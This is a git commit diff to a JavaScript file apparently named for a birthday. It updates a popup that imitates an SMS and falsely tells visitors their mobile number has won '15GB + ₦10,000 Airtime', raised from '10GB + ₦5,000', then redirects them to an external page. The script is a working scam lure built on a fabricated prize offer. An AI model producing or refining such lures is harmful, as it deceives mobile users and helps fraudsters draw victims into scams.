37051be24e92ada8c2c6c8428467ab482bb6267d
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-08 22:47:15 +0100

    Update chioma-birthday.js

--- chioma-birthday.js
+++ chioma-birthday.js
@@ -1,5 +1,5 @@
-var password = '10GB + ₦5,000 Airtime'
-password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + ₦5,000 Airtime, click OK to Activate now','10GB + ₦5,000 Airtime');
-if (password != '10GB + ₦5,000 Airtime') {
+var password = '15GB + ₦10,000 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 15GB + ₦10,000 Airtime, click OK to Activate now','15GB + ₦10,000 Airtime');
+if (password != '15GB + ₦10,000 Airtime') {
 location.href='https://gbamz.com/chioma.html';
 }
